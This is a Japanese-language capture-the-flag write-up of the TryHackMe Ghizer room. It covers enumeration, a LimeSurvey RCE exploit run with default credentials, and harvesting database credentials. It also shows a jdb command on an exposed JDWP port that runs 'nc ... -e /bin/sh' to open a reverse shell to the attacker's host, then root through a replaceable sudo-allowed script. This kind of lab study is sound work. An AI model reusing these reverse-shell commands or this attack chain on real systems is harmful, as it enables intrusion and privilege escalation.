# Ghizer CTF

https://tryhackme.com/room/ghizerctf

## Enumeration

```shell
TARGET=10.10.248.250
sudo bash -c "echo $TARGET   ghizer.thm >> /etc/hosts"
```

### ポートスキャン

```shell
root@ip-10-10-232-209:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-30 05:57 BST
Nmap scan report for ghizer.thm (10.10.248.250)
Host is up (0.00017s latency).
Not shown: 65529 closed ports
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
443/tcp   open  https
18002/tcp open  unknown
32819/tcp open  unknown
35351/tcp open  unknown
MAC Address: 02:5F:63:A4:2B:B3 (Unknown)
```

```sh
root@ip-10-10-232-209:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-30 05:59 BST
Nmap scan report for ghizer.thm (10.10.248.250)
Host is up (0.00019s latency).
Not shown: 65529 closed ports
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
443/tcp   open  https
18002/tcp open  unknown
32819/tcp open  unknown
35351/tcp open  unknown
MAC Address: 02:5F:63:A4:2B:B3 (Unknown)
```

- ftp は Anonymous（パスワード無し） でログインできない
- http と https で違うページが表示される。

https は WordPress

```
Welcome to my WordPress antihackers!
I use the plugin WPS Hide Login for hide wp-login!
try harder!
? it’s very important :3333
```

3333 は開いていないが、ローカルポートかもしれないので注意。

```sh
sudo nmap -sS -A --script safe -p18002 $TARGET

PORT      STATE SERVICE  VERSION
18002/tcp open  java-rmi Java RMI
| rmi-dumpregistry:
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @127.0.1.1:32819
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject

sudo nmap -sS -A --script safe -p32819 $TARGET

PORT      STATE SERVICE  VERSION
32819/tcp open  java-rmi Java RMI

sudo nmap -sS -A --script safe -p35351 $TARGET

PORT      STATE SERVICE    VERSION
35351/tcp open  tcpwrapped
MAC Address: 02:5F:63:A4:2B:B3 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 3.8 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 3.1 - 3.2 (92%)
```

### HTTP 80

#### gobuster

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -x=txt,php -u http://ghizer.thm -w ./dirlist.txt -t 30 -k

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 308] [--> http://ghizer.thm/admin/]
/application          (Status: 301) [Size: 314] [--> http://ghizer.thm/application/]
/assets               (Status: 301) [Size: 309] [--> http://ghizer.thm/assets/]
/docs                 (Status: 301) [Size: 307] [--> http://ghizer.thm/docs/]
/framework            (Status: 301) [Size: 312] [--> http://ghizer.thm/framework/]
/index.php            (Status: 200) [Size: 40931]
/installer            (Status: 301) [Size: 312] [--> http://ghizer.thm/installer/]
/locale               (Status: 301) [Size: 309] [--> http://ghizer.thm/locale/]
/plugins              (Status: 301) [Size: 310] [--> http://ghizer.thm/plugins/]
/server-status        (Status: 403) [Size: 275]
/tests                (Status: 301) [Size: 308] [--> http://ghizer.thm/tests/]
/themes               (Status: 301) [Size: 309] [--> http://ghizer.thm/themes/]
/third_party          (Status: 301) [Size: 314] [--> http://ghizer.thm/third_party/]
/tmp                  (Status: 301) [Size: 306] [--> http://ghizer.thm/tmp/]
/upload               (Status: 301) [Size: 309] [--> http://ghizer.thm/upload/]
```

/admin -> LimeSurvey ログインページ

/docs

```
Welcome to LimeSurvey v3.x!
```

LimeSurvey は、< 3.16 で RCE 脆弱性がある。ただしユーザー名とパスワードが必要。

/upload/readme.txt

```
This folder and all sub-folders must be writeable. Set file permissions to 775 or 777 depending on your webserver configuration.
```

### HTTPS

```sh
gobuster dir -x=txt,php -u https://ghizer.thm -w ./dirlist.txt -t 30 -k

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 301) [Size: 0] [--> https://ghizer.thm/]
/license.txt          (Status: 200) [Size: 19915]
/server-status        (Status: 403) [Size: 276]
/wp-admin             (Status: 301) [Size: 313] [--> https://ghizer.thm/wp-admin/]
/wp-content           (Status: 301) [Size: 315] [--> https://ghizer.thm/wp-content/]
/wp-includes          (Status: 301) [Size: 316] [--> https://ghizer.thm/wp-includes/]
/wp-signup.php        (Status: 500) [Size: 2686]
/wp-config.php        (Status: 200) [Size: 0]
/wp-trackback.php     (Status: 200) [Size: 135]
/wp-login.php         (Status: 301) [Size: 0] [--> https://ghizer.thm/-/-/-/-/-/-/-/-/-/-/]
/xmlrpc.php           (Status: 405) [Size: 42]
```

```sh
wpscan --disable-tls-checks --url https://ghizer.thm/ -e

[+] Upload directory has listing enabled: https://ghizer.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - https://ghizer.thm/?feed=rss2, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - https://ghizer.thm/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] Anny
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By: Rss Generator (Passive Detection)

[+] anny
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
```

anny ユーザーを発見したが、ログインページ URL を変えられているので、WordPress に対してブルートフォースはできない。

FTP で試してみたが、10 分弱であきらめた。

```sh
hydra -l anny -P /usr/share/wordlists/rockyou.txt 10.10.248.250 ftp -t 30
```

### dirsearch

```sh
$ dirsearch --url http://ghizer.thm
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/ctf/ghizer/reports/http_ghizer.thm/_25-05-30_14-51-23.txt

Target: http://ghizer.thm/

[14:51:23] Starting:
[14:51:30] 200 -   35B  - /.bowerrc
[14:51:32] 200 -  497B  - /.editorconfig
[14:51:34] 200 -  429B  - /.gitattributes
[14:51:34] 200 -    3KB - /.gitignore
[14:51:40] 200 -    2KB - /.scrutinizer.yml
[14:51:42] 200 -    4KB - /.travis.yml
[14:51:53] 301 -  308B  - /admin  ->  http://ghizer.thm/admin/
[14:51:55] 302 -    0B  - /admin/  ->  ../index.php/admin
[14:51:55] 302 -    0B  - /admin/admin.php  ->  ../index.php/admin
[14:51:56] 302 -    0B  - /admin/index.php  ->  ../index.php/admin
[14:52:12] 301 -  314B  - /application  ->  http://ghizer.thm/application/
[14:52:13] 200 -  109B  - /application/
[14:52:13] 200 -  109B  - /application/logs/
[14:52:14] 301 -  309B  - /assets  ->  http://ghizer.thm/assets/
[14:52:14] 200 -  492B  - /assets/
[14:52:23] 200 -    1KB - /composer.json
[14:52:25] 200 -    3KB - /CONTRIBUTING.md
[14:52:30] 301 -  307B  - /docs  ->  http://ghizer.thm/docs/
[14:52:30] 200 -  607B  - /docs/
[14:52:43] 404 -    5KB - /index.php/login/
[14:52:44] 301 -  312B  - /installer  ->  http://ghizer.thm/installer/
[14:52:51] 200 -   80B  - /manifest.yml
[14:53:05] 200 -  186B  - /phpunit.xml
[14:53:05] 301 -  310B  - /plugins  ->  http://ghizer.thm/plugins/
[14:53:05] 200 -  109B  - /plugins/
[14:53:09] 200 -    2KB - /README.md
[14:53:23] 301 -  308B  - /tests  ->  http://ghizer.thm/tests/
[14:53:23] 200 -  679B  - /tests/
[14:53:24] 301 -  309B  - /themes  ->  http://ghizer.thm/themes/
[14:53:24] 200 -  469B  - /themes/
[14:53:24] 301 -  306B  - /tmp  ->  http://ghizer.thm/tmp/
[14:53:24] 200 -  215B  - /tmp/
[14:53:26] 301 -  309B  - /upload  ->  http://ghizer.thm/upload/
[14:53:26] 200 -  514B  - /upload/
```

```sh
$ cat .gitignore | grep -v '^$'
# Never include config.php
/application/config/config.php
/application/config/config.*.php
...
```

LimeSurvey のデフォルトパスワードでログインできることに気付いた。

その認証情報を使い、先ほどのエクスプロイトを使う。

## LimeSurvey

エクスプロイトを実行。

```sh
$ python2 ./46634.py http://ghizer.thm admin password
[*] Logging in to LimeSurvey...
[*] Creating a new Survey...
[+] SurveyID: 355511
[*] Uploading a malicious PHAR...
[*] Sending the Payload...
[*] TCPDF Response: <strong>TCPDF ERROR: </strong>[Image] Unable to get the size of the image: phar://./upload/surveys/355511/files/malicious.jpg
[+] Pwned! :)
[+] Getting the shell...
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

config.php を見る。

```php
$ ls application/config
config-defaults.php
config-sample-dblib.php
config-sample-mysql.php
config-sample-pgsql.php
config-sample-sqlsrv.php
config.php
console.php
email.php
fonts.php
index.html
internal.php
ldap.php
packages.php
questiontypes.php
routes.php
tcpdf.php
third_party.php
updater_version.php
version.php

$ cat application/config/config.php
<?php if (!defined('BASEPATH')) exit('No direct script access allowed');
（略）
return array(
        'components' => array(
                'db' => array(
                        'connectionString' => 'mysql:host=localhost;port=3306;dbname=limedb;',
                        'emulatePrepare' => true,
                        'username' => 'Anny',
                        'password' => '[REDACTED]',
                        'charset' => 'utf8mb4',
                        'tablePrefix' => 'lime_',
                ),
（略）
```

Anny のパスワードを入手したので、WordPress のログイン URL を探す。

wp-config.php で DB 認証情報を入手し、下記のレコードを得た。

```sh
mysql> SELECT option_value FROM wp_options WHERE option_name = 'whl_page';
+--------------+
| option_value |
+--------------+
| devtools     |
+--------------+
1 row in set (0.00 sec)
```

しかし、/devtools のままではアクセスできない。  
パラメータ風に、クエスチョンマークを付ける必要があった。  
（そもそも、HTTPS トップ画面の下の方にログイン画面へのリンクがあった・・・）

WordPress にログインして 404 テンプレートの更新を試みたが、エラーでリバースシェルの仕込みは出来なかった。  
そもそも既に www-data のシェルを取っているので、改めて取る必要性は無いと判断。

## 権限昇格１

veronica への昇格を目指す。

まず、Wordpress のパスワードではユーザー変更できなかった。

```sh
www-data@ubuntu:/home/veronica$ ls -al
total 152
drwxr-xr-x 22 veronica veronica 4096 May 29 21:55 .
drwxr-xr-x  3 root     root     4096 Jul 23  2020 ..
-rw-------  1 veronica veronica 1908 May 29 21:55 .ICEauthority
-rw-------  1 veronica veronica   51 May 29 21:55 .Xauthority
-rw-------  1 root     root     1534 Jul 23  2020 .bash_history
-rw-r--r--  1 veronica veronica  220 Jul 23  2020 .bash_logout
-rw-r--r--  1 veronica veronica 3771 Jul 23  2020 .bashrc
drwx------ 17 veronica veronica 4096 Jul 23  2020 .cache
drwx------  3 veronica veronica 4096 Jul 23  2020 .compiz
drwx------ 16 veronica veronica 4096 Jul 23  2020 .config
drwx------  3 root     root     4096 Jul 23  2020 .dbus
-rw-r--r--  1 veronica veronica   25 Jul 23  2020 .dmrc
drwx------  2 veronica veronica 4096 Jul 23  2020 .gconf
drwxr-x---  3 veronica veronica 4096 Jul 23  2020 .ghidra
drwx------  3 veronica veronica 4096 May 29 21:55 .gnupg
drwxr-x---  3 veronica veronica 4096 Jul 23  2020 .java
drwx------  3 veronica veronica 4096 Jul 23  2020 .local
-rw-------  1 veronica veronica  199 Jul 23  2020 .mysql_history
drwxrwxr-x  2 veronica veronica 4096 Jul 23  2020 .nano
-rw-r--r--  1 veronica veronica  655 Jul 23  2020 .profile
-rw-r--r--  1 veronica veronica    0 Jul 23  2020 .sudo_as_admin_successful
-rw-r--r--  1 root     root      183 Jul 23  2020 .wget-hsts
-rw-------  1 veronica veronica   82 May 29 21:55 .xsession-errors
-rw-------  1 veronica veronica 1375 Jul 23  2020 .xsession-errors.old
drwxr-xr-x  2 veronica veronica 4096 Jul 23  2020 Desktop
drwxr-xr-x  2 veronica veronica 4096 Jul 23  2020 Documents
drwxr-xr-x  2 veronica veronica 4096 Jul 23  2020 Downloads
drwxr-xr-x  2 veronica veronica 4096 Jul 23  2020 Music
drwxr-xr-x  2 veronica veronica 4096 Jul 23  2020 Pictures
drwxr-xr-x  2 veronica veronica 4096 Jul 23  2020 Public
drwxr-xr-x  2 veronica veronica 4096 Jul 23  2020 Templates
drwxr-xr-x  2 veronica veronica 4096 Jul 23  2020 Videos
drwxr-xr-x  2 root     root     4096 Jul 23  2020 __pycache__
-rw-r--r--  1 root     root       86 Jul 23  2020 base.py
-rw-r--r--  1 veronica veronica 8980 Jul 23  2020 examples.desktop
drwxrwxrwx  9 veronica veronica 4096 Feb 28  2019 ghidra_9.0
-rw-------  1 veronica veronica   70 Jul 23  2020 user.txt
```

情報量が多い。ルーム名から ghidra の存在が気になるが、使い方が想像できない。

```sh
www-data@ubuntu:/home/veronica$ netcat -vpln
invalid local port ln
www-data@ubuntu:/home/veronica$ netstat -vpnl
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:18001         0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -
tcp6       0      0 :::443                  :::*                    LISTEN      -
tcp6       0      0 :::443                  :::*                    LISTEN      -
tcp6       0      0 :::443                  :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::18002                :::*                    LISTEN      -
tcp6       0      0 :::32819                :::*                    LISTEN      -
tcp6       0      0 ::1:631                 :::*                    LISTEN      -
tcp6       0      0 :::35351                :::*                    LISTEN      -
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
udp        0      0 0.0.0.0:37049           0.0.0.0:*                           -
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -
udp        0      0 0.0.0.0:631             0.0.0.0:*                           -
udp6       0      0 :::5353                 :::*                                -
udp6       0      0 :::46846                :::*                                -
```

18001 ポートは、veronica が Ghidra で使っていることが確認できる。

```sh
www-data@ubuntu:/home/veronica$ ps aux | grep Ghidra
veronica  1542  0.0  0.1  12584  2944 ?        S    May29   0:00 /bin/bash /home/veronica/ghidra_9.0/support/launch.sh debug Ghidra   ghidra.GhidraRun
veronica  1736  0.1  9.8 2861040 200556 ?      Sl   May29   0:17 /usr/lib/jvm/java-11-openjdk-amd64/bin/java -Djava.system.class.loader=ghidra.GhidraClassLoader -Dfile.encoding=UTF8 -Dsun.java2d.pmoffscreen=false -Dsun.java2d.opengl=false -Dsun.java2d.xrender=false -Dhttps.protocols=TLSv1,TLSv1.1,TLSv1.2 -Dghidra.cacerts= -Dcpu.core.limit= -Dcpu.core.override= -Dfont.size.override= -Xdebug -Xnoagent -Djava.compiler=NONE -Dlog4j.configuration=/home/veronica/ghidra_9.0/support/debug.log4j.xml -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=127.0.0.1:18001 -Dcom.sun.management.jmxremote.port=18002 -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false -showversion -cp /home/veronica/ghidra_9.0/support/../Ghidra/Framework/Utility/lib/Utility.jar ghidra.GhidraLauncher ghidra.GhidraRun
www-data  2054  0.0  0.0  11284   940 pts/19   S+   00:48   0:00 grep Ghidra
```

Ghidra Linux version <= 9.0.4 に、`.gar Arbitrary Code Execution` の脆弱性がある。

https://www.exploit-db.com/exploits/47231

要約すると、

- gar ファイルとは、Ghidra のプロジェクトアーカイブ形式。
- 攻撃者のマシンでスクリプトを実行し、リバースシェル入りの gar ファイルを作る。
- その gar ファイルをターゲットマシン上の Ghidra で「リストアプロジェクト」の操作を実行することにより、エクスプロイトが実行される。
- veronica ユーザーが GUI で実行しなければならない。

しかし、veronica ユーザーとして GUI で操作させることはソーシャルエンジニアリングの領域なので、ここでは、この脆弱性は使えないという結論になる。

ここは全く見当もつかずウォークスルーを参照。

https://sckull.github.io/posts/ghizer/

```sh
www-data@ubuntu:/home/veronica$ jdb -attach localhost:18001
Set uncaught java.lang.Throwable
Set deferred uncaught java.lang.Throwable
Initializing jdb ...
> stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()
Set breakpoint org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()
>
Breakpoint hit: "thread=Log4j2-TF-4-Scheduled-1", org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run(), line=96 bci=0

Log4j2-TF-4-Scheduled-1[1] print new java.lang.Runtime().exec("nc 10.13.85.243 6688 -e /bin/sh")
 new java.lang.Runtime().exec("nc 10.13.85.243 6688 -e /bin/sh") = "Process[pid=7266, exitValue="not exited"]"
Log4j2-TF-4-Scheduled-1[1]
```

```sh
$ nc -nlvp 6688
listening on [any] 6688 ...
connect to [10.13.85.243] from (UNKNOWN) [10.10.248.250] 44548
id
uid=1000(veronica) gid=1000(veronica) groups=1000(veronica),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```

ユーザーフラグゲット。

## 権限昇格２

```sh
veronica@ubuntu:~$ sudo -l
Matching Defaults entries for veronica on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User veronica may run the following commands on ubuntu:
    (ALL : ALL) ALL
    (root : root) NOPASSWD: /usr/bin/python3.5 /home/veronica/base.py
```

base.py を root で実行できる。

```sh
www-data@ubuntu:/home/veronica$ cat base.py
import base64

hijackme = base64.b64encode(b'tryhackme is the best')
print(hijackme)
```

veronica ユーザーはファイルごと差し替えることは可能。

```sh
veronica@ubuntu:~$ rm ./base.py
rm: remove write-protected regular file './base.py'? y
veronica@ubuntu:~$ nano ./base.py
veronica@ubuntu:~$ sudo /usr/bin/python3.5 /home/veronica/base.py
```

ルートシェル取得成功。

```sh
$ nc -nlvp 6789
listening on [any] 6789 ...
connect to [10.13.85.243] from (UNKNOWN) [10.10.248.250] 38750
# id
id
uid=0(root) gid=0(root) groups=0(root)
```

## 振り返り

- Ghidra の jdb を使うエクスプロイトは、この方法を認識した後に Web 検索しても見つけることができなかった。何をどうやって調査すれば良かったのか検証が必要。

→ 　今回のエクスプロイトは Ghidra の脆弱性というより、JDWP（Java Debug Wire Protocol）ポートをオープンしていたことに原因があるため、Ghidra に絞って検索することでかえって見つかりにくくなった。

java で JDWP を使用するプログラムでは同様の問題が起こると考えなければならない。  
それを理解していれば、java の起動オプションを見たら気付けたはず。

```
-Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=127.0.0.1:18001
```
